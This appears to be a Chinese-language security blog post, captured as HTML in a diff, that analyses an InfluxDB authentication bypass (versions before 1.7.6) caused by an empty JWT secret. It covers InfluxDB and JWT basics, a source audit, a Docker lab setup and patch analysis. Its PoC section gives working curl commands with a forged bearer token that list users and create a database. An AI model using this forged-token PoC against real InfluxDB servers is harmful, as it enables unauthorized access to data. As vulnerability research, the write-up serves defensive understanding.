@@ -1,0 +1,498 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,GO,Influxdb,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>浅析Influxdb认证绕过漏洞 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        浅析Influxdb认证绕过漏洞
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2020-01-01T14:35:17.000Z">
+        2020-01-01
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GO/">GO</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Influxdb/">Influxdb</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="Influxdb简介"><a href="#Influxdb简介" class="headerlink" title="Influxdb简介"></a>Influxdb简介</h3><p>TSDB（Time Series DataBase，时序数据库）是针对时间戳或时间序列数据进行优化的数据库，专门为处理带有时间戳的度量和事件度量而构建的。而时间序列数据可以是随时间跟踪、监视、下采样和聚合的度量或事件，如服务器指标、应用程序性能、网络数据、传感器数据以及许多其他类型的分析数据。</p>
+<p>Influxdb是一个开源的时序数据库，由GO语言编写，用于处理高写入和高查询负载。Influxdb被广泛应用于存储系统的监控数据，IoT行业的实时数据等场景。</p>
+<h3 id="关键特性"><a href="#关键特性" class="headerlink" title="关键特性"></a>关键特性</h3><p>Influxdb具有以下关键特性：</p>
+<ul>
+<li>能够高速读取和压缩时间序列数据</li>
+<li>使用 <code>Go</code> 编写，能够但文件运行，没有依赖</li>
+<li>提供了简单、高效的 <code>HTTP</code> 读写接口</li>
+<li>能够使用插件支持其他的数据协议，如： <code>Graphite=， =collectd</code> 和 <code>OpenTSDB</code></li>
+<li>可轻松使用 <code>SQL</code> 语言查询聚合数据</li>
+<li>能够使用 <code>Tag</code> 进行快速高效的查询</li>
+<li>支持保留策略(<code>Retention Policy</code>), 能够自动清理旧数据</li>
+<li>支持持续查询，能够自动定期计算聚合数据，提高了查询的效率</li>
+</ul>
+<h3 id="与传统数据库的概念比较"><a href="#与传统数据库的概念比较" class="headerlink" title="与传统数据库的概念比较"></a>与传统数据库的概念比较</h3><table>
+<thead>
+<tr>
+<th>Influxdb</th>
+<th>传统数据库</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>database</td>
+<td>数据库</td>
+</tr>
+<tr>
+<td>measurement</td>
+<td>表，但不支持联合查询</td>
+</tr>
+<tr>
+<td>point</td>
+<td>表中的一行数据</td>
+</tr>
+</tbody>
+</table>
+<p>其中point由时间戳（time）、数据（field）、标签（tags）组成，相当于传统数据库里的一行数据：</p>
+<table>
+<thead>
+<tr>
+<th>point属性</th>
+<th>传统数据库中的概念</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>time</td>
+<td>主键</td>
+</tr>
+<tr>
+<td>tags</td>
+<td>有索引的列</td>
+</tr>
+<tr>
+<td>fields</td>
+<td>没索引的列</td>
+</tr>
+</tbody>
+</table>
+<h3 id="目录与文件结构"><a href="#目录与文件结构" class="headerlink" title="目录与文件结构"></a>目录与文件结构</h3><p>Influxdb的数据存储即在其根目录下的database目录中主要有三个目录。默认情况下是meta、wal和data。</p>
+<ul>
+<li>meta目录：用于存储数据库的一些元数据，meta目录下有一个meta.db文件；</li>
+<li>wal目录：存放预写日志文件，以.wal结尾；</li>
+<li>data目录：存放实际存储的数据文件，以.tsm结尾。</li>
+</ul>
+<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>InfluxDB的配置文件为：/etc/influxdb/influxdb.conf</p>
+<p>选项详情请参见：<a href="https://docs.influxdata.com/influxdb/v1.7/administration/config/" target="_blank" rel="noopener">Configuration Settings</a></p>
+<h3 id="常用的InfluxQL语句"><a href="#常用的InfluxQL语句" class="headerlink" title="常用的InfluxQL语句"></a>常用的InfluxQL语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看所有的数据库</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"><span class="comment">-- 使用特定的数据库</span></span><br><span class="line"><span class="keyword">use</span> database_name;</span><br><span class="line"><span class="comment">-- 查看所有的measurement</span></span><br><span class="line"><span class="keyword">show</span> measurements;</span><br><span class="line"><span class="comment">-- 查询10条数据</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> measurement_name <span class="keyword">limit</span> <span class="number">10</span>;</span><br><span class="line"><span class="comment">-- 数据中的时间字段默认显示的是一个纳秒时间戳，改成可读格式</span></span><br><span class="line">precision rfc3339; <span class="comment">-- 之后再查询，时间就是rfc3339标准格式</span></span><br><span class="line"><span class="comment">-- 或可以在连接数据库的时候，直接带该参数</span></span><br><span class="line">influx -precision rfc3339</span><br><span class="line"><span class="comment">-- 查看一个measurement中所有的tag key </span></span><br><span class="line"><span class="keyword">show</span> tag <span class="keyword">keys</span></span><br><span class="line"><span class="comment">-- 查看一个measurement中所有的field key </span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">field</span> <span class="keyword">keys</span></span><br><span class="line"><span class="comment">-- 查看一个measurement中所有的保存策略(可以有多个，一个标识为default)</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">retention</span> policies;</span><br></pre></td></tr></table></figure>
+<h3 id="Influxdb函数详解"><a href="#Influxdb函数详解" class="headerlink" title="Influxdb函数详解"></a>Influxdb函数详解</h3><p>参考：<a href="https://tanjiti.github.io/2019/02/20/influxdb函数详解/" target="_blank" rel="noopener">influxdb函数详解</a></p>
+<h3 id="HTTP接口"><a href="#HTTP接口" class="headerlink" title="HTTP接口"></a>HTTP接口</h3><p>Influxdb相关接口具体可参考官方文档：</p>
+<p>下面之看下几个简单的例子。</p>
+<h4 id="query"><a href="#query" class="headerlink" title="/query"></a>/query</h4><p>数据主要使用/query接口查询，下面给出一些常见用法，而更多用法参见：<a href="https://docs.influxdata.com/influxdb/v1.7/guides/querying_data/" target="_blank" rel="noopener">Querying data with the HTTP API</a> 。</p>
+<ul>
+<li><p>创建数据库</p>
+<p>POST请求可用于创建数据库，如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:8086/query --data-urlencode <span class="string">"q=CREATE DATABASE &lt;databasename&gt;"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查询</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET http://localhost:8086/query?pretty=<span class="literal">true</span> --data-urlencode <span class="string">'db=&lt;database name&gt;'</span> --data-urlencode <span class="string">'q=SELECT "field1","tag1"... FROM &lt;measurement&gt; WHERE &lt;condition&gt;'</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="write"><a href="#write" class="headerlink" title="/write"></a>/write</h4><p>发送POST请求是写入数据的主要方式，下面给出一些常见用法，而更多用法参见：<a href="https://docs.influxdata.com/influxdb/v1.7/guides/writing_data/" target="_blank" rel="noopener">Writing data with the HTTP API</a> 。</p>
+<ul>
+<li><p>插入一条Point：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:8086/write?db=&lt;database name&gt; --data-binary <span class="string">"cpu_load,machine=001,region=cn value=0.56 1555164637838240795"</span></span><br></pre></td></tr></table></figure>
+<p>必须指定<code>database name</code></p>
+</li>
+</ul>
+<h3 id="身份认证机制——JWT"><a href="#身份认证机制——JWT" class="headerlink" title="身份认证机制——JWT"></a>身份认证机制——JWT</h3><p>Influxdb支持基于密码的身份认证和基于JWT的身份认证。</p>
+<p>下面详细介绍JWT机制。</p>
+<h4 id="JWT基本原理"><a href="#JWT基本原理" class="headerlink" title="JWT基本原理"></a>JWT基本原理</h4><p>JWT即JSON Web Tokens，是目前最流行的跨域身份验证解决方案。</p>
+<p>JWT的原理就是在服务器身份验证之后，将生成一个JSON对象并将其发送回用户，如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"Username"</span>: <span class="string">"mi1k7ea"</span>,</span><br><span class="line">  <span class="string">"Role"</span>: <span class="string">"Admin"</span>,</span><br><span class="line">  <span class="string">"Expire"</span>: <span class="string">"2020-01-01 00:00:00"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此后，用户与服务端通信时，都要发回这个JSON对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。</p>
+<p>服务器不保存任何session数据，也就是说，服务器变成无状态，从而比较容易实现扩展。</p>
+<h4 id="JWT原理图"><a href="#JWT原理图" class="headerlink" title="JWT原理图"></a>JWT原理图</h4><p>如下：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/1.png" alt=""></p>
+<h4 id="JWT结构"><a href="#JWT结构" class="headerlink" title="JWT结构"></a>JWT结构</h4><p>一个示例的JWT如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure>
+<p>这是一个很长的字符串，中间用点<code>.</code>分隔成三个部分。</p>
+<p>一个JWT实际上就是一个字符串，由三部分组成：</p>
+<ul>
+<li>Header（头部）</li>
+<li>Payload（载荷）</li>
+<li>Signature（签名）</li>
+</ul>
+<h5 id="Header（头部）"><a href="#Header（头部）" class="headerlink" title="Header（头部）"></a>Header（头部）</h5><p>Header部分是一个JSON对象，描述JWT的元数据，通常是下面的样子。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="attr">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面代码中，alg属性表示签名的算法（algorithm），默认是HMAC SHA256（写成HS256）；typ属性表示这个令牌（token）的类型（type），JWT令牌统一写为JWT。</p>
+<p>最后，将上面的JSON对象使用Base64URL算法转成字符串。</p>
+<h5 id="Payload（载荷）"><a href="#Payload（载荷）" class="headerlink" title="Payload（载荷）"></a>Payload（载荷）</h5><p>Payload部分也是一个JSON对象，用来存放实际需要传递的数据。JWT规定了7个官方字段供选用：</p>
+<ul>
+<li>iss (issuer)：签发人</li>
+<li>exp (expiration time)：过期时间</li>
+<li>sub (subject)：主题</li>
+<li>aud (audience)：受众</li>
+<li>nbf (Not Before)：生效时间</li>
+<li>iat (Issued At)：签发时间</li>
+<li>jti (JWT ID)：编号</li>
+</ul>
+<p>除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"sub"</span>: <span class="string">"1234567890"</span>,</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"John Doe"</span>,</span><br><span class="line">  <span class="attr">"admin"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>注意，JWT默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</strong></p>
+<p>这个JSON对象也要使用Base64URL算法转成字符串。</p>
+<h5 id="Signature（签名）"><a href="#Signature（签名）" class="headerlink" title="Signature（签名）"></a>Signature（签名）</h5><p>Signature部分是对前两部分的签名，防止数据篡改。</p>
+<p>首先，<strong>需要指定一个密钥（secret）</strong>。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是HMAC SHA256），按照下面的公式产生签名：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + "." +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>
+<p>算出签名以后，把Header、Payload、Signature三个部分拼成一个字符串，每个部分之间用<code>.</code>分隔，就可以返回给用户。</p>
+<h5 id="Base64URL算法"><a href="#Base64URL算法" class="headerlink" title="Base64URL算法"></a>Base64URL算法</h5><p>前面提到，Header和Payload串型化的算法是Base64URL。这个算法跟Base64算法基本类似，但有一些小的不同。</p>
+<p>JWT作为一个令牌（token），有些场合可能会放到URL（比如api.example.com/?token=xxx）。Base64有三个字符<code>+</code>、<code>/</code>和<code>=</code>，在URL里面有特殊含义，所以要被替换掉：<code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。这就是Base64URL算法。</p>
+<h4 id="JWT的用法"><a href="#JWT的用法" class="headerlink" title="JWT的用法"></a>JWT的用法</h4><p>客户端收到服务器返回的JWT，可以储存在Cookie或LocalStorage中。</p>
+<p>此后，客户端每次与服务器通信，都要带上这个JWT。你可以把它放在Cookie里面自动发送，但是这样不能跨域，所以更好的做法是放在HTTP请求的头信息<code>Authorization</code>字段里面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure>
+<p>另一种做法是，跨域的时候JWT就放在POST请求的数据体里面。</p>
+<h4 id="如何生成JWT"><a href="#如何生成JWT" class="headerlink" title="如何生成JWT"></a>如何生成JWT</h4><p>在线网站可生成JWT凭据：<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p>
+<h2 id="0x02-Influxdb认证绕过漏洞"><a href="#0x02-Influxdb认证绕过漏洞" class="headerlink" title="0x02 Influxdb认证绕过漏洞"></a>0x02 Influxdb认证绕过漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Influxdb &lt; 1.7.6 的版本。</p>
+<h3 id="漏洞原理及代码审计"><a href="#漏洞原理及代码审计" class="headerlink" title="漏洞原理及代码审计"></a>漏洞原理及代码审计</h3><p>Influxdb认证绕过漏洞，说白了就是默认的不安全配置导致的逻辑漏洞（未校验JWT的Signature部分的secret即密钥是否为空），可导致正常的身份认证被绕过。在Influxdb中，JWT的默认设置不会在“共享秘密”键中创建任何值。换句话说，默认情况下，创建有效的JWT令牌所需的“secret”为空。</p>
+<p>下面我们下载1.7.5版本的Influxdb源码进行GO语言的代码审计，可控漏洞点出在哪里。</p>
+<p>我们知道PoC是如下的形式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://xxx:8086/query'</span> --data-urlencode <span class="string">'q=show users'</span> -H <span class="string">'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k'</span></span><br></pre></td></tr></table></figure>
+<p>那么直接搜索关键词来寻找对应的认证代码，如搜索“Authorization”，找到influxdb-1.7.5\services\httpd\handler.go这个文件。在其中看到authenticate()即认证函数，这里会调用parseCredentials()函数来解析凭证，然后根据返回的凭证方法到下面的switch语句中匹配：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/2.png" alt=""></p>
+<p>跟进parseCredentials()函数，当中获取Authorization头字段，若不为空，则通过空格切割其值，然后switch语句匹配第一个值的内容，当匹配到“Bearer”时则返回包含Method为“BearerAuthentication”的creds变量：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/3.png" alt=""></p>
+<p>返回到authenticate()函数中，继续往下，就能匹配到switch语句的BearerAuthentication代码块：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/4.png" alt=""></p>
+<p>这段代码解析到token具体的值后，获取其中声明的exp和username的值，这里exp需要满足float64类型的数值、username需要是个字符串类型，接着根据username即用户名去查找是否存在该用户，若都不报错则调用inner()函数成功往下执行，即认证成功。</p>
+<p>在这里我们可以明显看到，我们的JWT的Signature部分的secret即密钥是可以设置为空的，因为这里没有对其是否为空进行校验，并且默认也是为空的，即：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + "." +</span><br><span class="line">  base64UrlEncode(payload),)</span><br></pre></td></tr></table></figure>
+<p>由于没有使用密钥对前面两个部分的内容进行加密，因此任意用户只要知道用户名就可以构造JWT凭证来绕过认证。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>这里我们使用Docker来搭建漏洞环境。</p>
+<p>依次执行如下命令即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索Influxdb Docker容器</span></span><br><span class="line">docker search influxdb</span><br><span class="line"><span class="comment"># 拉取漏洞版本的镜像</span></span><br><span class="line">docker pull influxdb:1.7.5</span><br><span class="line"><span class="comment"># 运行docker容器</span></span><br><span class="line">docker run -it -d --name influxdb -p 8086:8086 influxdb:1.7.5</span><br><span class="line"><span class="comment"># 进入运行的docker容器中</span></span><br><span class="line">docker <span class="built_in">exec</span> -it influxdb /bin/bash</span><br></pre></td></tr></table></figure>
+<p>接着新建数据库用户，在influx终端运行如下命令创建新用户mi1k7ea：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; use _internal</span><br><span class="line">Using database _internal</span><br><span class="line">&gt; create user "mi1k7ea" with password '123456' with all privileges</span><br><span class="line">&gt; show users</span><br><span class="line">user    admin</span><br><span class="line"><span class="comment">----    -----</span></span><br><span class="line">mi1k7ea true</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<p>然后在Influxdb的配置文件/etc/influxdb/influxdb.conf中添加配置开启认证：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/10.png" alt=""></p>
+<p>然后重启即可。</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>先确定版本号是否存在漏洞，这里看到版本为1.7.5 &lt; 1.7.6，是存在认证绕过漏洞的版本：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/6.png" alt=""></p>
+<p>接着，判断Influxdb服务绑定的端口号以及是否在公网进行监听：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/7.png" alt=""></p>
+<p>默认情况下，Influxdb服务是绑定在8086端口上供其他进程访问的。如果是监听在公网上，则存在未授权访问漏洞，漏洞危害达到最大化。</p>
+<p>下面的利用先在本地测试。</p>
+<p>输入如下命令进行用户名发现：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://127.0.0.1:8086/debug/requests'</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/8.png" alt=""></p>
+<p>可以看到并没有返回数据库相关的用户名。</p>
+<p>尝试直接访问/query接口，发现没有认证凭据不能访问：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G -X POST <span class="string">'http://127.0.0.1:8086/query'</span> --data-urlencode <span class="string">'q=show users'</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/13.png" alt=""></p>
+<h4 id="构造PoC"><a href="#构造PoC" class="headerlink" title="构造PoC"></a>构造PoC</h4><p>下面我们就来构造实现认证绕过的JWT。</p>
+<p>由前面的分析知道，我们需要填写的仅仅是第二部分的Payload中的username和exp而已。这里username是Influxdb中存在的用户名即可，而exp (expiration time)即认证有效时间，需要我们设置得比当前时间大。</p>
+<p>我们可以通过在线工具方便地获取：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/14.png" alt=""></p>
+<p>除了线上的方法，这里列下几种编程语言生成时间戳的代码实现。</p>
+<p>Java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">int</span>) (System.currentTimeMillis() / <span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
+<p>Python：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.time()</span><br></pre></td></tr></table></figure>
+<p>PHP：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time()</span><br></pre></td></tr></table></figure>
+<p>这样，就可以直接到<code>https://jwt.io/</code>中构造JWT了，这里攻击者只需知道Influxdb数据库存在mi1k7ea用户即可（注意：第三部分Signature中的secret即密钥设置为空，因为默认都是无共享密钥的，即使目标服务端设置了我们也无从知道也无法利用）：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/12.png" alt=""></p>
+<p>最终PoC如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://127.0.0.1:8086/query'</span> --data-urlencode <span class="string">'q=show users'</span> -H <span class="string">'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k'</span></span><br></pre></td></tr></table></figure>
+<p>本地利用效果如图，成功查询得到用户信息：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/11.png" alt=""></p>
+<p>修改下PoC的利用方式，添加新的数据库：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://127.0.0.1:8086/query'</span> --data-urlencode <span class="string">'q=create database hacked'</span> -H <span class="string">'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k'</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/15.png" alt=""></p>
+<p>远程利用也是一样的，直接往目标服务端的Influxdb接口发送PoC即可成功利用：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/9.png" alt=""></p>
+<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>这里下载1.7.6版本的Influxdb，打开influxdb-1.7.6\services\httpd\handler.go这个文件对比发现，在解析JWT之前多了一段代码：</p>
+<p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/5.png" alt=""></p>
+<p>可以看到该代码判断当前JWT的secret即密钥是否为空，若为空则直接报错，从而修补了漏洞。</p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>升级Influxdb至最新版即可。</p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.komodosec.com/post/when-all-else-fails-find-a-0-day" target="_blank" rel="noopener">When all else fails – find a 0-day</a></p>
+<p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">JSON Web Token 入门教程</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基本概念"><span class="toc-text">0x01 基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Influxdb简介"><span class="toc-text">Influxdb简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关键特性"><span class="toc-text">关键特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#与传统数据库的概念比较"><span class="toc-text">与传统数据库的概念比较</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#目录与文件结构"><span class="toc-text">目录与文件结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#配置"><span class="toc-text">配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用的InfluxQL语句"><span class="toc-text">常用的InfluxQL语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Influxdb函数详解"><span class="toc-text">Influxdb函数详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP接口"><span class="toc-text">HTTP接口</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#query"><span class="toc-text">/query</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#write"><span class="toc-text">/write</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#身份认证机制——JWT"><span class="toc-text">身份认证机制——JWT</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JWT基本原理"><span class="toc-text">JWT基本原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JWT原理图"><span class="toc-text">JWT原理图</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JWT结构"><span class="toc-text">JWT结构</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Header（头部）"><span class="toc-text">Header（头部）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Payload（载荷）"><span class="toc-text">Payload（载荷）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Signature（签名）"><span class="toc-text">Signature（签名）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Base64URL算法"><span class="toc-text">Base64URL算法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JWT的用法"><span class="toc-text">JWT的用法</span></a></li><li 